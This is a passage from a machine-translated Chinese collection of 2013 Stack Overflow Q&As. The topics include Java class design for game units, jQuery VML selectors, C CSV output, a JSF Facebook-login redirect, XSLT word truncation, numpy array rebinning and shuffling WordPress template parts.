 StringBuilder a =new StringBuilder("abc");
        StringBuilder b = a;
        f(b);
        b.append("fg");
        System.out.println(a + " " + b);
    }

  public static void f(StringBuilder b){
        b.append("de");
        b=null;
    } 
```

现在您的输出将是“abcdefg”，因为 stringbuilder 对象 b 已作为对象本身的值传递给 f。我修改了值，但没有使用“new”来指向另一个对象。希望现在清楚。***

# javascript - 如何使用 jquery 或纯 javascript 选择 vml 元素？

> ID：14916521
> 
> 赞同：2
> 
> 时间：2013-02-16T23:57:27.107
> 
> 标签：javascript, jquery, html, dom, vml

我想用 jquery 选择一个 VML 元素而不使用 'id' 或 'class' 但我的尝试没有奏效。

```
<v:oval id="vmlElement" style='width:100pt;height:75pt' fillcolor="red"> </v:oval>

$(document).ready(function(){
    //don't work
    var oItem = $("v");//from here I should look for the n-th 'v' element, but for this example it is not necessary
    $(oItem).attr("fillcolor", "green")
    //alert($(oItem).attr("fillcolor"));

    //This worked, but I can't use select to id, or class
    $('#vmlElement').eq(0).attr("fillcolor", "green");
}); 
```

我知道`VML`它太旧了，最好使用`SVG`. 但是由于我们需要与旧版浏览器兼容，所以我们必须使用`VML`. 对于所有人`Normal - Browser`，我们使用的是 SVG，一切都像魅力一样运行。

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:02:58.777

您可以尝试使用完整的标签名称，即`v:oval`.

使用 jQuery：

```
$("v\\:oval") 
```

使用 JavaScript：

```
document.getElementsByTagName("v:oval") 
```

请注意，您需要转义`:`.

# java - Java - 我的代码显然违背了常见的 OOD 范例，但不知道如何改进它

> ID：14916524
> 
> 赞同：12
> 
> 时间：2013-02-16T23:58:00.887
> 
> 标签：java, oop, class, hashtable

## 编辑：我真的很感谢大家的意见。我从所有的回复中获得了一些东西，并且学到了很多关于 OOD 的知识。

我正在制作一个简单的虚拟桌面战争游戏。为了表示战场上的单位，我有以下简单的类层次结构：一个抽象类 Unit，以及两个派生类，Troop 和 Vehicle。

我有另一个类，其中包含游戏中所有单位的哈希表。哈希表值是 Unit 类型，所以我可以在 O(1) 时间内引用它们。

在大多数情况下，这很好，但有时调用者需要知道某物是部队还是车辆，才能从这些派生类中调用特定方法。为了适应这种情况，我创建了两个强制执行类型的 get 方法：

```
 public Troop getTroop(String uniqueID) {
    Unit potentialTroop = get(uniqueID);
    if(potentialTroop instanceof Vehicle) {
      throw new InternalError();
    }
    return (Troop) potentialTroop;
  }

  public Vehicle getVehicle(String uniqueID) {
    Unit potentialVehicle = get(uniqueID);
    if(potentialVehicle instanceof Troop) {
      throw new InternalError();
    }
    return (Vehicle) potentialVehicle;
  } 
```

（注意 this 所属的类只是扩展了 Hashtable，所以这里使用的 get 方法是 Java 的 hashtable 的 get 方法。）

所以我认为这是糟糕的 OOD 设计，因为如果我进一步扩展单元，我将不得不向这个哈希表添加更多检查和更多#get 方法。

我这样说对吗？如果是这种情况，是否有人有其他 OOD 建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-17T00:17:40.800

在这种情况下，我不会扩展 HashTable（或任何其他类）。您的类可以在内部使用 HashTable，但通过扩展它，您会暴露很多公共 API。暴露的越少越好。您通常应该支持组合而不是继承。

这样您就可以更灵活地存储对象。在您的情况下，您可以在内部拥有 3 张地图；一个包含所有单位，一个仅用于部队，一个仅用于车辆。给定的单元将存储在两个地图中，因此您必须同步单元的添加和删除以确保各个地图之间的完整性。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-17T00:48:18.260

为什么不只实现一个`get`返回的方法`Unit`呢？我相信如果这两个类有非常具体的不同方法，那么它们就没有很多共同点，不是吗？您希望它们成为子类的事实`Unit`使我认为它们的相似性超出了“它们是在地图上具有位置的对象”这一事实。在这种情况下，“错误”的部分将给方法提供不同的名称并分别调用它们。一种让事情变得更好的方法是

*   从哈希表中只返回 Unit
*   正如已经建议的那样，在可能的情况下制作综合方法，例如`behave()`, `move()`，这对两个类都是通用的，因此可以在不强制转换的情况下调用（即使它们会做不同的事情）。使用您创建的层次结构！这些方法最终将调用您之前创建的小型模块化方法（现在将变为`private`）。
*   您并不总是需要知道 的类型`Unit`，对吗？仅在必要时（无法使用上述技术解决），将此类工作委托给您定义为“调用者”的对象，我不认为它是一个单一的、固定的实体。换句话说，只有当你必须决定你的单位是否用步枪射击时才进行类型检查。当您要执行常见任务时，无需预期这种区别。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-17T00:49:30.890

这是一个简单的方法，不一定是最好的，但它满足这些要求：

1.  能够从您的`Unit`集合中动态获取特定类型
2.  以后可以添加其他`Unit`类型，而无需添加一堆处理程序方法。

该解决方案使用“模板”类来执行匹配：

```
@SuppressWarnings("unchecked")
public <T extends Unit> T getSpecializedUnitType(Class<T> unitTypeClass, String uniqueID) {
    Unit potentialTroop = units.get(uniqueID);
    if(potentialTroop == null) return null;

    return potentialTroop.getClass().equals(unitTypeClass) ?
        (T) potentialTroop : null;
} 
```

我假设您将更正您的代码，而不是从 扩展`Map`，而是封装它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-17T00:20:30.103

这个 getVehicle() 和 getTroops() 几乎就像一个 if(elem instanceof X) 语句链，除了它有例外。我讨厌那种链，但在这种情况下，我更喜欢这种链，并且不理会哈希表。

但是，如果您需要调用的特定方法可以被认为是 Vehicle 或 Troop 的“特定行为”，那么您应该考虑将它们放在 Unit 类中的抽象方法中，并在每个类中覆盖它。如果不是这种情况，请提供有关您需要对您的单元做什么的更多信息，以便我们可以找到一个很好的概括。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-02-17T07:34:20.277

我喜欢 Perception 提供的解决方案，但我认为它可以进一步改进。这是我的版本：

```
public <T extends Unit> T getSpecializedUnitType(Class<T> unitClass, String id) {
    Unit unit = units.get(id);
    return unitClass.cast(unit);
} 
```

`unit`如果是`null`，则不返回任何抑制的警告，`null`如果不是，则将其强制转换为必要的类型。如果类型错误，`ClassCastException`则抛出。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-02-17T00:37:12.203

这是类设计中很常见的问题，不幸的是，没有一个好的解决方案，因为解决方案会随着问题的细节而变化。比您现在拥有的更好的设计是通过一个通用接口（例如您的 Unit）来表达每种类型的类型信息和功能。

这是一种我认为更好的可能性，尽管有些人会认为它仍然不是*很好*，因为抛出 UnsupportedOperationException 的方法。我使用 Groovy 更简洁，但它与 Java 足够接近，您应该明白这一点。看看它是否满足您的需求：

```
abstract class Unit {
    enum UnitType { TROOP, VEHICLE }
    abstract UnitType getType()
    TroopAbilities getTroopAbilities() {
        throw new UnsupportedOperationException('not a Troop') 
    }
    VehicleAbilities getVehicleAbilities() { 
        throw new UnsupportedOperationException('not a Vehicle') 
    }
}

interface TroopAbilities {
    void doTroopThing()
}

interface VehicleAbilities {
    void doVehicleThing()
}

class Troop extends Unit implements TroopAbilities {
    void doTroopThing() { println 'something troopy' }
    UnitType getType() { UnitType.TROOP }
    TroopAbilities getTroopAbilities() { this }
}

class Vehicle extends Unit implements VehicleAbilities {
    void doVehicleThing() { println 'something vehicle-ish' }
    UnitType getType() { UnitType.VEHICLE }
    VehicleAbilities getVehicleAbilities() { this }
}

List<Unit> units = [new Troop(), new Vehicle(), new Troop()]
for (Unit unit : units) {
    switch (unit.getType()) {
        case Unit.UnitType.TROOP:
            unit.getTroopAbilities().doTroopThing()
            break;
        case Unit.UnitType.VEHICLE:
            unit.getVehicleAbilities().doVehicleThing()
            break;
        default:
            throw new IllegalStateException(
                "New unit type that's not accounted for: " + unit.getType())
    }
} 
```

此外，如果你在接口和实现之间做出明确的突破，你的生活会更简单，所以 Unit 应该更像：

```
interface Unit {
    enum UnitType { TROOP, VEHICLE }
    UnitType getType()
    TroopAbilities getTroopAbilities()
    VehicleAbilities getVehicleAbilities()
}

abstract class AbstractUnit implements Unit {
    TroopAbilities getTroopAbilities() {
        throw new UnsupportedOperationException('not a Troop')
    }
    VehicleAbilities getVehicleAbilities() {
        throw new UnsupportedOperationException('not a Vehicle')
    }
} 
```

然后，您的具体单元类型将扩展 AbstractUnit，然后您正确地使用继承来实现代码重用和多态性，以允许每个子类以自己的方式对消息做出反应。唯一的灰色区域是 get*Abilties() 方法，但目前我想不出解决这些问题的好方法。

**更新以减少工作量：**如果您想将其缩减到最低限度并删除一些可扩展性选项和枚举的安全性，您可以这样做：

```
interface Unit {
    abstract String getType()
    Troop asTroop()
    Vehicle asVehicle()
}

abstract class AbstractUnit implements Unit {
    Troop asTroop() {
        throw new UnsupportedOperationException('not a Troop')
    }
    Vehicle asVehicle() {
        throw new UnsupportedOperationException('not a Vehicle')
    }
}

class Troop extends AbstractUnit {
    void doTroopThing() { println 'something troopy' }
    String getType() { "troop" }
    Troop asTroop() { this }
}

class Vehicle extends AbstractUnit {
    void doVehicleThing() { println 'something vehicle-ish' }
    String getType() { "vehicle" }
    Vehicle asVehicle() { this }
}

List<Unit> units = [new Troop(), new Vehicle(), new Troop()]
for (Unit unit : units) {
    switch (unit.getType()) {
        case "troop":
            unit.asTroop().doTroopThing()
            break;
        case "vehicle":
            unit.asVehicle().doVehicleThing()
            break;
        default:
            throw new IllegalStateException(
                "New unit type that's not accounted for: " + unit.getType())
    }
} 
```

# c - 在 C 中写入 CSV 文件

> ID：14916527
> 
> 赞同：8
> 
> 时间：2013-02-16T23:58:24.913
> 
> 标签：c, csv

我的 C 程序生成这些数据。我需要将其放入 CSV 文件中，以便其他程序可以使用它。我怎样才能做到这一点？

```
Student1 Mark1 Mark2 Mark3 Mark4 Mark5
Student2 Mark1 Mark2 Mark3 Mark4 Mark5
Student3 Mark1 Mark2 Mark3 Mark4 Mark5
Student4 Mark1 Mark2 Mark3 Mark4 Mark5
Student5 Mark1 Mark2 Mark3 Mark4 Mark5 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-17T00:01:58.910

你可以通过`fprintf`

```
for(i = 0; i < num_of_students; i++)
     fprintf(fptr, "%s,%d,%d,%d,%d,%d\n", name, mark1, mark2, mark3, mark4, mark5); 
```

# java - 比较日期并查看密码是否过期（1 年）JAVA

> ID：14916528
> 
> 赞同：-2
> 
> 时间：2013-02-16T23:58:27.977
> 
> 标签：java, mysql, jakarta-ee, date, prepared-statement

我将以 YEAR-MONTH-DAY ex(2013-02-01) 的格式从 mySQL 获取日期。我如何能够使用 ResultSet 检索日期，然后将其与今天的日期进行比较，以查看它是否一岁。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:04:50.093

ResultSet 具有将返回 Date 对象的[getDate() 方法。](http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html#getDate%28int%29)之后，如果您不太关心精度或闰年等，这里有一个比较它们的简短方法：

```
Date fromDatabase = ...;
Date now = new Date();
long daysBetween = TimeUnit.DAYS.convert(now.getTime() - fromDatabase.getTime(), TimeUnit.MILLISECONDS);
if (daysBetween > 365) { ... } 
```

如果您的意思是将日期存储为字符串值而不是数据库中的日期，则可以将其解析为`new SimpleDateFormat("yyyy-MM-dd").parse("2013-02-01")`.

在处理数据库中的日期时，请记住时区。保持直截了当可能会很棘手。

# javascript - 如何在javascript中找出对象和字符串的字节大小以分析数据的效率

> ID：14916534
> 
> 赞同：1
> 
> 时间：2013-02-16T23:59:00.443
> 
> 标签：javascript, json, node.js

我在服务器上发送以下数据。

```
 var loc = {
            type            : 'exloc',                      
            ms              : this.var1.move,
            ppx             : this.var1.ppx,
            ppy             : this.var1.ppy,
            Name            : "red",
            rid             : this.gv.GlobalInfoHolder.CurrentRoomID
        }; 
```

我也可以用以下形式发送这些数据。

```
 var obj = "type=exloc,ms="+this.var1.move+",ppx="+this.var1.ppx+",ppy="+this.var1.ppy+",Name=red,rid="+this.gv.GlobalInfoHolder.CurrentRoomID; 
```

然后我可以`strip`根据我输入的逗号获取数据。

另一种方法是对对象进行编码，`json`然后将数据发送到服务器并解码。

所以我想问一下，最好的解决方案是什么？如果有人告诉我如何分析每个变量的字节大小，包括 json 解决方案，那就更好了。

我想寻找给我变量最小的解决方案。如果有人想建议他/她最受欢迎的东西，我这样做是为了提高性能和效率。我正在考虑这个，因为我正在实时工作必须非常快速（以毫秒为单位）在客户端和服务器之间共享数据的游戏

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:01:38.103

只需获取一个网络分析器程序（例如免费的 Fiddler 或许多其他可用于同一事物的程序），然后查看通过网络发送的确切内容。我一直这样做是为了调试客户端/服务器问题。这真的很简单，可以准确地向您展示客户端和服务器之间发送的内容。

JSON 并不是存储效率最高的格式，因此如果您尝试优化大小，您可能已经知道这可能不是最佳选择，因为冗余较少的格式（字段名称的单个副本与多个副本）几乎总是会更紧凑。

此外，您应该首先弄清楚这些是否重要。如果您的数据总体上很小，那么 40 字节和 80 字节之间的性能差异可能太小，甚至无法在单个客户端上进行测量。另一方面，如果您有数千条记录要传输，那么每条记录的大小就足以产生影响。

# php - php mySQL pdo auto_increment 行的主键

> ID：14916536
> 
> 赞同：1
> 
> 时间：2013-02-16T23:59:16.493
> 
> 标签：php, mysql

使用php时如何设置允许mySQL在mySQL中自动增加一行？我已使用 phpMyAdmin 将 link_id 列设置为 auto_increment，但我不知道如何在使用 PDO 时使行自动递增。

```
$preparedStatement = $con->prepare('INSERT INTO link (link_id, category, link_desc, link_url) VALUES (:link_id, :category, :link_desc, :link_url)');
$preparedStatement-> execute(array(':link_id' => **AUTO INCREMENT Field in mySQL**, ':category' => $category,':link_desc' => $link_desc,':link_url' => $link_url)); 
```

我在这里先向您的帮助表示感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:01:09.087

您不必对 PHP 做任何特别的事情，但在 MySQL 中有几种方法。一种是使用虚假值或空值：

```
INSERT INTO link (<columns>) VALUES (null, category... 
```

只需排除 PHP 中的参数。

您还可以指定要插入的列，如果您不使用 auto_increment 键，它会自动递增：

```
INSERT INTO link (category, link_desc...) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:05:58.447

您可以使用任何值填充`AUTO_INCREMENT`INSERT 语句中的列...... MySQL 将自动覆盖`AUTO_INCREMENT`在您的语句中定义的列值并正确处理新值。

在控制台模式下，如果值设置不正确，它会生成警告，但在 PHP 中，我认为它将被忽略。

# facebook - 在 JSF 中使用已填写的表单重定向到另一个页面？

> ID：14916539
> 
> 赞同：0
> 
> 时间：2013-02-17T00:00:05.067
> 
> 标签：facebook, jsf, redirect, jsf-2, callback

我正在尝试做一个“使用 facebook 登录”按钮，它工作正常，但我想重定向到另一个页面，用户数据填写在表单中。

社交 Facebook 控制器

```
public void login(){
    try {
        //Create an instance of SocialAuthConfig object
        SocialAuthConfig config  = SocialAuthConfig.getDefault();

        //load configuration. By default load the configuration from oauth_consumer.properties. 
        //You can also pass input stream, properties object or properties file name.
        config.load(); 

        //Create an instance of SocialAuthManager and set config
        SocialAuthManager manager = new SocialAuthManager();
        manager.setSocialAuthConfig(config);

        //URL of YOUR application which will be called after authentication
        String successUrl = "http://localhost:8080/cc/pages/system/register.xhtml";

        // get Provider URL to which you should redirect for authentication.
        // id can have values "facebook", "twitter", "yahoo" etc. or the OpenID URL
        String url = manager.getAuthenticationUrl("facebook", successUrl);

        // Store in session
        HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
        session.setAttribute("authManager", manager);

        //after check out in facebook, redirect to the proper page
        logged();

        //redirect to the successful login page
        FacesContext.getCurrentInstance().getExternalContext().redirect(url);
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

} 
```

因此，当用户点击按钮时，`log in with facebook`我的 ' ' `index.xhtml`：

```
<h:body>
    <h:form id="login-facebook">
        <h:commandButton id="login" action="#{socialFacebook.login}" value="Login"/>
    </h:form>
</h:body> 
```

它重定向到`register.xhtml`具有如下 URL 的页面：

```
http://localhost:8080/cc/pages/system/register.xhtml?code=AQC_3oCPjlyvZ51dpzxVdBNS1JfgwwZluBSduU7FG01esgVQT6Qxq8gWYRUsGz64aXDvXB1195m0CHZGmdvsmjLxtmbuUSSSqH7i49pcb6g9Begt4Yol1rqWFQGGGGGGGGGGGJ9mlWiEq4Aknlh1J2su2a9l0GzyLB21J4BgNgfBw3DUtwn-RkT00E7BsFpISiXKE7EVsT5NgxPBtOWIUY#_=_ 
```

现在的问题是，我想在我的 bean 中获取此代码并进行检查并填写表单`register.xhtml` 所以我在同一个 bean 中创建了这个方法：

```
private void logged(){
    FacesContext facesContext = FacesContext.getCurrentInstance();
    HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
    SocialAuthManager manager = (SocialAuthManager) session.getAttribute("authManager");
    try {
        // get the auth provider manager from session
        if (manager != null){
            // call connect method of manager which returns the provider object. 
            // Pass request parameter map while calling connect method.
            HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
            Map<String, String> paramsMap = SocialAuthUtil.getRequestParametersMap(request);
            AuthProvider provider = manager.connect(paramsMap);

            // get profile
            Profile p = provider.getUserProfile();
            session.setAttribute("profile", p);
        }

    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
} 
```

但是我无法`code`从我的请求中获取参数。我怎样才能得到这个代码，然后检查并填写表格？

** **编辑**

社交Facebook.java

```
package jpa.control;

// imports..

@ManagedBean(name="socialFacebook")
@RequestScoped
public class SocialFacebook implements Serializable{
    private static final long serialVersionUID = -4787254243136316495L;

    @ManagedProperty("#{param.code}")
    private String code;

    public void login(){
        try {
            //Create an instance of SocialAuthConfig object
            SocialAuthConfig config  = SocialAuthConfig.getDefault();

            //load configuration. By default load the configuration from oauth_consumer.properties. 
            //You can also pass input stream, properties object or properties file name.
            config.load(); 

            //Create an instance of SocialAuthManager and set config
            SocialAuthManager manager = new SocialAuthManager();
            manager.setSocialAuthConfig(config);

            //URL of YOUR application which will be called after authentication
            String successUrl = "http://localhost:8080/cc/pages/system/register.xhtml";

            // get Provider URL to which you should redirect for authentication.
            // id can have values "facebook", "twitter", "yahoo" etc. or the OpenID URL
            String url = manager.getAuthenticationUrl("facebook", successUrl);

            // Store in session
            HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
            session.setAttribute("authManager", manager);

            //after check out in facebook, redirect to the proper page
            logged();

            //redirect to the successful login page
            FacesContext.getCurrentInstance().getExternalContext().redirect(url);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

    }

    private void logged(){
        FacesContext facesContext = FacesContext.getCurrentInstance();
        HttpSession session = (HttpSession) FacesContext.getCurrentInstance().getExternalContext().getSession(false);
        SocialAuthManager manager = (SocialAuthManager) session.getAttribute("authManager");

        System.out.println("*******************************");
        System.out.println(code); // keeps return NULL everytime
        System.out.println("*******************************");

        try {
            // get the auth provider manager from session
            if (manager != null){
                // call connect method of manager which returns the provider object. 
                // Pass request parameter map while calling connect method.
                HttpServletRequest request = (HttpServletRequest) FacesContext.getCurrentInstance().getExternalContext().getRequest();
                Map<String, String> paramsMap = SocialAuthUtil.getRequestParametersMap(request);
                AuthProvider provider = manager.connect(paramsMap);

                // get profile
                Profile p = provider.getUserProfile();
                session.setAttribute("profile", p);
            }

        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    // Get's and Set's
    public String getCode() {
        return code;
    }

    public void setCode(String code) {
        this.code = code;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T12:52:01.723

我解决了创建一个`webfilter`获取请求和响应的问题，然后我可以在我的 url 中填写用户日期，然后在我的表单页面中获取：

```
@WebFilter("/facebook/*")
public class LoginFilter implements Filter {

    @EJB UserEAO userEAO;

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws ServletException, IOException {    
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        HttpSession session = request.getSession();
        FacesContext facesContext = FacesContext.getCurrentInstance();

        try {

            SocialAuthManager manager = (SocialAuthManager) session.getAttribute("authManager");
            Map<String, String> paramsMap = SocialAuthUtil.getRequestParametersMap(request);
            AuthProvider provider = manager.connect(paramsMap);

            // get profile
            Profile p = provider.getUserProfile();

            if (userEAO.find(p.getEmail()) == null){
                response.sendRedirect
                (
                    request.getContextPath() + 
                    "/pages/system/register.xhtml?" +
                    "firstName=" + p.getFirstName()
                );
            }
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } 
```

这是我的`register`页面：

```
<ui:composition template="/resources/jsf/include/default.xhtml">
    <ui:define name="title">
    </ui:define>

    <ui:define name="header">
    </ui:define>

    <ui:define name="content">

        <h:form id="register_form">
            <f:metadata>
                  <f:viewParam name="firstName" value="#{userc.userb.user.firstName}" />
               </f:metadata>

            Name: <h:message id="m_name" for="name" styleClass="red" />
            <h:inputText id="name" value="#{userc.userb.user.firstName}">
                <f:validateLength minimum="1" maximum="20" />
                <f:ajax event="blur" render="m_name" />
            </h:inputText> 
```

# xslt - 获取文本节点的最大起始子字符串，使得其中的最后一个单词不被截断，并且它的长度不超过给定的限制

> ID：14916540
> 
> 赞同：1
> 
> 时间：2013-02-17T00:00:14.573
> 
> 标签：xslt, xpath, xslt-1.0

如何使用 xsl 仅选择 n 个评论元素。我可以选择 n 个字符，但是会在单词中间卡住，让它看起来很难看。

我已经能够计算“评论”节点中的单词总数，但不确定如果那里总共有 20 个单词，如何只显示 15 个单词。

```
 <div class="NewsDescription">
  <xsl:value-of select="string-length(translate(normalize-space(@Comments),'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',''))+1" /> 
    <xsl:value-of select="substring(@Comments,0,120)"/>
    <xsl:if test="string-length(@Comments) &gt; 120">…&lt;/xsl:if>
    <a href="{$SafeLinkUrl}" class="ReadMore" style="font-size:11px ;font-family:Arial, Helvetica, sans-serif;color :#00aeef">Read More</a> 
   </div> 
```

实际的xml是这样的。我正在尝试以“相关故事”的方式在动态页面的右侧汇总故事片段。

```
<news>
   <title>Story title</title>
    <comments> story gist here..a couple of sentences.</comments>
    <content> actualy story </content> 
```

请帮忙。我通过 Marc andersen 找到了这个资源，但是 xsl 对我来说太复杂了，无法过滤并利用自己..

[http://sympmarc.com/2010/07/13/displaying-the-first-n-words-of-announcement-bodies-with-xsl-in-a-dvwp/](http://sympmarc.com/2010/07/13/displaying-the-first-n-words-of-announcement-bodies-with-xsl-in-a-dvwp/)

来自 XSL 专家的一些帮助将不胜感激..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:20:48.143

**Here is a non-recursive, pure XSLT 1.0 solution:**

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:variable name="vUpper" select="'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"/>
 <xsl:variable name="vLower" select="'abcdefghijklmnopqrstuvwxyz'"/>
 <xsl:variable name="vDigits" select="'0123456789'"/>

 <xsl:variable name="vAlhanum" select="concat($vLower, $vUpper, $vDigits)"/>

 <xsl:template match="comments">
   <xsl:param name="pText" select="."/>
     <xsl:choose>
       <xsl:when test="not(string-length($pText) > 120)">
         <xsl:value-of select="$pText"/>
       </xsl:when>
         <xsl:otherwise>
           <xsl:variable name="vTruncated" select="substring($pText, 1, 121)"/>
             <xsl:variable name="vPunct" 
                           select="translate($vTruncated, $vAlhanum, '')"/>
           <xsl:for-each select=
           "(document('')//node() | document('')//@* | document('')//namespace::*)
                           [not(position() > 121)]">

             <xsl:variable name="vPos" select="122 - position()"/>
             <xsl:variable name="vRemaining" select="substring($vTruncated, $vPos+1)"/>

             <xsl:if test=
              "contains($vPunct, substring($vTruncated, $vPos, 1))
              and
               contains($vAlhanum, substring($vTruncated, $vPos -1, 1))
              and
                 string-length(translate($vRemaining, $vPunct, ''))
                         = string-length($vRemaining)
              ">
              <xsl:value-of select="substring($vTruncated, 1, $vPos -1)"/>
             </xsl:if>
           </xsl:for-each>
      </xsl:otherwise>
     </xsl:choose>
 </xsl:template>
 <xsl:template match="text()"/>
</xsl:stylesheet> 
```

**When this transformation is applied on the following XML document:**

```
<news>
   <title>Story title</title>
    <comments> story gist here..a couple of sentences. Many more sentences ...
even some more text with lots of meaning and sense aaand a lot of humor. </comments>
    <content> actualy story </content>
</news> 
```

**the wanted, correct result is produced**:

```
 story gist here..a couple of sentences. Many more sentences ...
even some more text with lots of meaning and sense 
```

# numpy - Numpy 重新组合二维数组

> ID：14916545
> 
> 赞同：11
> 
> 时间：2013-02-17T00:00:42.770
> 
> 标签：numpy, binning

我正在寻找一种快速公式来对 2D numpy 数组进行数值分箱。通过分箱，我的意思是计算子矩阵平均值或累积值。例如。x = numpy.arange(16).reshape(4, 4) 将被分成 4 个 2x2 的子矩阵，并给出 numpy.array([[2.5,4.5],[10.5,12.5]]) 其中 2.5=numpy。平均（[0,1,4,5]）等...

如何以有效的方式执行这样的操作......我真的不知道如何执行这个......

非常感谢...

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-17T01:01:46.277

您可以使用数组的更高维视图并沿额外维度取平均值：

```
In [12]: a = np.arange(36).reshape(6, 6)

In [13]: a
Out[13]: 
array([[ 0,  1,  2,  3,  4,  5],
       [ 6,  7,  8,  9, 10, 11],
       [12, 13, 14, 15, 16, 17],
       [18, 19, 20, 21, 22, 23],
       [24, 25, 26, 27, 28, 29],
       [30, 31, 32, 33, 34, 35]])

In [14]: a_view = a.reshape(3, 2, 3, 2)

In [15]: a_view.mean(axis=3).mean(axis=1)
Out[15]: 
array([[  3.5,   5.5,   7.5],
       [ 15.5,  17.5,  19.5],
       [ 27.5,  29.5,  31.5]]) 
```

一般来说，如果你想要`(a, b)`数组的形状箱`(rows, cols)`，你的重塑应该是`.reshape(rows // a, a, cols // b, b)`. 另请注意，的顺序`.mean`很重要，例如`a_view.mean(axis=1).mean(axis=3)`会引发错误，因为`a_view.mean(axis=1)`只有三个维度，虽然`a_view.mean(axis=1).mean(axis=2)`可以正常工作，但更难理解发生了什么。

照原样，上面的代码仅在您可以在数组中容纳整数个 bin 时才有效，即 if `a`divides`rows`和`b`divides `cols`。有一些方法可以处理其他情况，但是你必须定义你想要的行为。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-21T03:14:58.097

请参阅[有关 rebinning 的 SciPy Cookbook](http://wiki.scipy.org/Cookbook/Rebinning)，其中提供了以下代码段：

```
def rebin(a, *args):
    '''rebin ndarray data into a smaller ndarray of the same rank whose dimensions
    are factors of the original dimensions. eg. An array with 6 columns and 4 rows
    can be reduced to have 6,3,2 or 1 columns and 4,2 or 1 rows.
    example usages:
    >>> a=rand(6,4); b=rebin(a,3,2)
    >>> a=rand(6); b=rebin(a,2)
    '''
    shape = a.shape
    lenShape = len(shape)
    factor = asarray(shape)/asarray(args)
    evList = ['a.reshape('] + \
             ['args[%d],factor[%d],'%(i,i) for i in range(lenShape)] + \
             [')'] + ['.sum(%d)'%(i+1) for i in range(lenShape)] + \
             ['/factor[%d]'%i for i in range(lenShape)]
    print ''.join(evList)
    return eval(''.join(evList)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T00:40:05.963

我假设您只想知道如何通常构建一个性能良好并使用数组执行某些操作的函数，就像`numpy.reshape`在您的示例中一样。因此，如果性能真的很重要并且您已经在使用 numpy，那么您可以为此编写自己的 C 代码，就像 numpy 一样。例如，[arange](https://github.com/numpy/numpy/blob/v1.7.0/numpy/core/src/multiarray/ctors.c#L2734)的实现完全在 C 中。几乎所有与性能有关的 numpy 都在 C 中实现。

但是，在这样做之前，您应该尝试在 python 中实现代码，看看性能是否足够好。尝试使 python 代码尽可能高效。如果它仍然不适合您的性能需求，请使用 C 方式。

[您可以在docs](http://docs.python.org/2/extending/extending.html)中阅读相关内容。

# php - Wordpress 中的随机 get_template_part

> ID：14916546
> 
> 赞同：1
> 
> 时间：2013-02-17T00:00:44.477
> 
> 标签：php, wordpress, templates, random

我正在寻找一种以随机顺序显示四个模板部分的方法。它们排列在 2x2 网格中，每次加载页面时我都需要不同的顺序。这是代码：

```
<!-- Feature 1 -->
      <div class="grid_half">
        <?php get_template_part( 'features/feat','1' ); //Get Features Section 1 ?>
    </div><!-- /.grid_half -->
<!-- Feature 2 -->
      <div class="grid_half_last"> 
        <?php get_template_part( 'features/feat','2' ); //Get Features Section 2 ?>
     </div><!-- /.grid_half_last -->
      <div class="clear"></div>
<!-- Feature 3 -->
      <div class="grid_half"> 
        <?php get_template_part( 'features/feat','3' ); //Get Features Section 3 ?>
      </div><!-- /.grid_half -->
<!-- Feature 4 -->
      <div class="grid_half_last">
        <?php get_template_part( 'features/feat','4' ); //Get Features Section 4 ?>
      </div><!-- /.grid_half_last -->
      <div class="clear"></div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:04:25.407

```
$order = array(1, 2, 3, 4);
shuffle($order); 
```

然后：

```
get_template_part( 'features/feat', array_shift($order) ); 
```

为了确保在 4 个连续的页面请求中不会获得相同的顺序，您必须跟踪这个数组，可能是通过会话或客户端 cookie。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T00:22:32.170

这似乎对我有用：

```
 <?php $features = array('1', '2', '3', '4'); 
        shuffle($features); ?>
<!-- Feature 1 -->
      <div class="grid_half">
        <?php get_template_part( 'features/feat', $features[0] ); //Get Features Section 1 ?>
    </div><!-- /.grid_half -->
<!-- Feature 2 -->
      <div class="grid_half_last"> 
        <?php get_template_part( 'features/feat', $features[1] ); //Get Features Section 2 ?>
     </div><!-- /.grid_half_last -->
